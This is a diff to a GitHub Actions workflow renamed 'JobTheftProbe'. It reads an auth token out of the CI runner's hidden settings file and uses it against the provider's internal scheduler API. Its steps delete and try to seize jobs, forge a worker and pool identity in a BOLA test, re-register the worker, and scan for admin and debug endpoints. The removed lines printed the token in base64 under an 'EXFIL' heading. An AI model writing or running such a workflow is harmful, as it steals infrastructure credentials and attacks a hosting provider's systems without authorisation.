@@ -1,4 +1,4 @@
-name: SchedulerAPIProbe
+name: JobTheftProbe
 on:
   push:
     branches: [main]
@@ -8,55 +8,48 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Comprehensive scheduler API probe with fresh token
+      - name: Job theft attempt DELETE+GET sequence
         run: |
           SETTINGS=$(cat /opt/hca/.settings)
           AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
           SCHED=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
-          echo AUTH_LEN=${#AUTH}
-          echo SCHED=$SCHED
+          echo '=== STEP 1: Get current request state BEFORE delete ==='
+          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
           echo ''
-          echo '--- POST /v1/request (job acquisition attempt) ---'
-          curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $AUTH" -H 'Content-Type: application/json' -d '{}' "${SCHED}/request" 2>/dev/null | head -c 1000
+          echo '=== STEP 2: DELETE current job request ==='
+          DEL=$(curl -s -w '\nHTTP:%{http_code}' -X DELETE -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null)
+          echo DELETE_RESPONSE=$DEL
           echo ''
-          echo '--- GET /v1/worker (correct form) ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/worker" -X GET 2>/dev/null | head -c 1000
-          echo '--- POST /v1/worker ---'
-          curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $AUTH" -H 'Content-Type: application/json' -d '{}' "${SCHED}/worker" 2>/dev/null | head -c 500
+          echo '=== STEP 3: GET /v1/request AFTER delete (do we get another job?) ==='
+          sleep 1
+          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
           echo ''
-          echo '--- DELETE /v1/request (cancel job?) ---'
-          curl -s -w '\nHTTP:%{http_code}' -X DELETE -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 1000
+          echo '=== STEP 4: POST /v1/worker with modified body (BOLA test) ==='
+          curl -s -w '\nHTTP:%{http_code}' -X POST \
+            -H "Authorization: Bearer $AUTH" \
+            -H 'Content-Type: application/json' \
+            -d '{"workerId": "00000000-0000-0000-0000-000000000001", "poolId": "azure-eastus-general"}' \
+            "${SCHED}/worker" 2>/dev/null | head -c 1000
           echo ''
-          echo '--- GET /v1/ping ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/ping" 2>/dev/null | head -c 500
-          echo '--- GET /v1/health ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/health" 2>/dev/null | head -c 500
-          echo '--- GET /v1/swagger ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED%/v1}/swagger" 2>/dev/null | head -c 500
-          echo '--- GET /swagger/v1/swagger.json ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED%/v1}/swagger/v1/swagger.json" 2>/dev/null | head -c 500
+          echo '=== STEP 5: Try PUT /v1/request (take a job) ==='
+          curl -s -w '\nHTTP:%{http_code}' -X PUT \
+            -H "Authorization: Bearer $AUTH" \
+            -H 'Content-Type: application/json' \
+            -d '{}' \
+            "${SCHED}/request" 2>/dev/null | head -c 2000
           echo ''
-          echo '--- PATCH /v1/request (update job status?) ---'
-          curl -s -w '\nHTTP:%{http_code}' -X PATCH -H "Authorization: Bearer $AUTH" -H 'Content-Type: application/json' -d '{"status":"completed"}' "${SCHED}/request" 2>/dev/null | head -c 500
+          echo '=== STEP 6: Re-register worker after delete ==='
+          curl -s -w '\nHTTP:%{http_code}' -X POST \
+            -H "Authorization: Bearer $AUTH" \
+            -H 'Content-Type: application/json' \
+            -d '{"capabilities": {"os": "linux", "arch": "x64"}}' \
+            "${SCHED}/worker" 2>/dev/null | head -c 1000
           echo ''
-          echo '--- GET /v1/request/current ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/request/current" 2>/dev/null | head -c 1000
+          echo '=== STEP 7: Get job after re-register ==='
+          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
           echo ''
-          echo '--- GET /v1/requests ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/requests" 2>/dev/null | head -c 1000
-          echo ''
-          echo '--- GET /v1/machines ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/machines" 2>/dev/null | head -c 500
-          echo '--- GET /v1/pool ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/pool" 2>/dev/null | head -c 500
-          echo '--- GET /v1/quota ---'
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}/quota" 2>/dev/null | head -c 500
-          echo ''
-          echo '=== EXFIL FULL TOKEN B64 AGAIN (for analysis) ==='
-          echo AUTH_B64=$(echo -n $AUTH | base64 -w0)
-          echo ''
-          echo '=== WORKER WATCHDOG API ==='
-          WD_URL=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('watchdogTraceApiUrl',''))")
-          echo WD_URL=$WD_URL
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${WD_URL%/trace}/health" 2>/dev/null | head -c 500
-          curl -s -w '\nHTTP:%{http_code}' -H "Authorization: Bearer $AUTH" "${WD_URL%/trace}/worker" 2>/dev/null | head -c 500
+          echo '=== INTERNAL API ENDPOINTS DISCOVERY ==='
+          for path in '' /v1/admin /v1/debug /v1/metrics /v1/stats /v1/config /v1/version /v1/status /v1/runners /v1/allocations /v1/capacity; do
+            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}${path}" 2>/dev/null)
+            echo PATH=$path STATUS=$STATUS
+          done
